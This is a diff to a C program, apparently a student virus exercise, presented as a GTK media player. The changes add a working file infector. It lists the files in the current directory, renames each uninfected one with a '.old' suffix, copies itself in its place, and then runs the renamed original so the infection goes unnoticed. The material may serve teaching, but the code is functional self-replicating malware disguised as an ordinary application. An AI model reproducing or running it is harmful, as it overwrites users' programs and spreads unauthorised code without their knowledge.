@@ -6,9 +6,11 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <stdbool.h>
+#include <sys/wait.h>
 
 GtkImage * image;
-int n = 5;
+char * prog;
+int n;
 int k = 0;
 void on_destroy_main_window(GtkButton *button, gpointer user_data){
     gtk_main_quit();
@@ -32,36 +34,86 @@ void on_btn_prev_clicked(GtkButton *button, gpointer user_data){
 void step3infection(char * file_name){
 	printf("%s\n", "\nStep 3 - Infection fichier");
 	// rename executables
-	if (strcmp(file_name, "mediaplayer") != 0){
-		char old_name[100];
+	if (strcmp(file_name, "test") != 0){
+		char old_name[1000];
 		strcpy(old_name, file_name);
 		char * old = ".old";
 		strcat(file_name, old);
 		rename (old_name, file_name);
-
-		// copy virus
-		 pid_t ret_val = fork(); 
-		  if(ret_val == 0) {
-	    	execl("/bin/cp","cp","mediaplayer",old_name,NULL);
-		 }
+		pid_t p = fork(); 
+		if(p == 0) {
+	      execl("/bin/cp","cp",prog,old_name,NULL);
+		}
 	}
 }
 
+void copy(char * src, char * dest){
+	FILE *source, *target;
+    char ch;
+
+   source = fopen(src, "r");
+   target = fopen(dest, "w");
+   if (source == NULL){
+      exit(EXIT_FAILURE);
+   }
+   if (target == NULL){
+      fclose(source);
+      exit(EXIT_FAILURE);
+   }
+   while ((ch = fgetc(source)) != EOF)
+      fputc(ch, target);
+
+   fclose(source);
+   fclose(target);
+}
+
+void step3infection2(char * file_name){
+	printf("%s\n", "\nStep 3 - Infection fichier");
+	int status;
+	if (strcmp(file_name, prog) != 0){
+		char old_name[100];
+		strcpy(old_name, file_name);
+		char * old = ".old";
+		strcat(file_name, old);
+		printf("avant : %s apres %s\n", old_name, file_name);
+		//char * oldname ="oldname";
+	    //char * newname ="newname.txt";
+	    int result= rename( old_name , file_name );
+	    if ( result == 0 ){
+	    	puts ( "File successfully renamed" );
+	    	pid_t p = fork(); 
+	    	if(p == 0) {
+	    		
+	    		execl("/bin/cp","cp",prog,old_name,NULL);
+	    	} else {
+	    		waitpid(p,&status,0);
+	    	}
+
+			//pid_t p = fork(); 
+			//if(p == 0) {
+	     	//	execl("/bin/cp","cp",progCpy,old_nameCpy,NULL);
+			//}
+		}
+	    else
+	    	perror( "Error renaming file" );
+	  }
+	
+}
 
 bool step2VerificationInfection(char * file_name){
 	//verif .old si oui -> infécté, sinon regarder si il est dans le rep courant : strstr 
 	printf("%s\n", "\nStep 2 - Vérification fichier infecté");
 	char * ret = strstr(file_name, ".old");
-	if (ret)
+	if (ret){
 		return true;
+	}
 
-	char file[100];
+	char file[1000];
 	strcpy(file,file_name);
 	char * old = ".old";
 	strcat(file,old);
-	if (fopen(file,"r"))
+	if (fopen(file,"r") != NULL)
 		return true;
-	
 	return false;
 }
 
@@ -89,18 +141,24 @@ void step1listProg(char ** executables){
     pDir = opendir (".");
     if (pDir != NULL) {
 	    while ((pDirent = readdir(pDir)) != NULL) {
-	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
+	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0 && strcmp(pDirent->d_name,"")){
 	        	executables[i] = pDirent->d_name;
+				printf("%s\n", executables[i]);
 	        	i++;
 	        }
 	    }
 	}
+
     closedir (pDir);
 }
 
 int main(int argc, char *argv[]){
+	
 	GtkBuilder *builder;
-    GtkWidget *window;
+	GtkWidget *window;
+	
+	prog = strtok (argv[0],"./");
+	
     gtk_init(&argc, &argv);
     builder = gtk_builder_new();
     gtk_builder_add_from_file(builder, "../media_player.glade", NULL);
@@ -113,23 +171,53 @@ int main(int argc, char *argv[]){
 	bool infect = false;
 	char * executables[n];
 	step1listProg(executables);
-	for (int i = 0; i < n; i++){
+	for (int i = 0 ; i < n ; i++){
 		infect = step2VerificationInfection(executables[i]);
 		if (infect == 0){
-			printf ("%s infecté : False\n", executables[i]);
+			printf("pas infecté : file name : %s\n", executables[i]);
+			step3infection2(executables[i]);
+		} else {
+			printf ("infecté : %s\n", executables[i]);
+		}
+	}
+	/*for (int i = 0; i < n; i++){
+		infect = step2VerificationInfection(executables[i]);
+		if (infect == 0){
+		  	
 			step3infection(executables[i]);
 		} else {
 			printf ("%s infecté : True\n", executables[i]);
 		}
 		stat(executables[i],&buf);
-		printf("Status executable : %o\n", buf.st_mode & S_IXUSR);
-	    printf("Status régulier : %o\n", buf.st_mode & S_IFREG);
+		//printf("Status executable : %o\n", buf.st_mode & S_IXUSR);
+	    //printf("Status régulier : %o\n", buf.st_mode & S_IFREG);
+	} 
+
+	if (strcmp(prog,"mediaplayer") != 0){
+		strcat(prog,".old");
+		pid_t p = fork(); 
+		if(p == 0) {
+	    	execl(prog,NULL,NULL);
+		}
 	}
-	   
+	*/
+	if (strcmp(prog,"mediaplayer") != 0){
+		strcat(prog,".old");
+		int status;
+		pid_t p = fork(); 
+		if(p == 0) {
+	    	execl(prog,NULL,NULL);
+		}
+		waitpid(p,&status,0);
+		return 0;
+	}
 
 	g_object_unref(builder);
+	
 	gtk_widget_show(window);
+	
 	gtk_main();
+	
 
     return 0;
 }
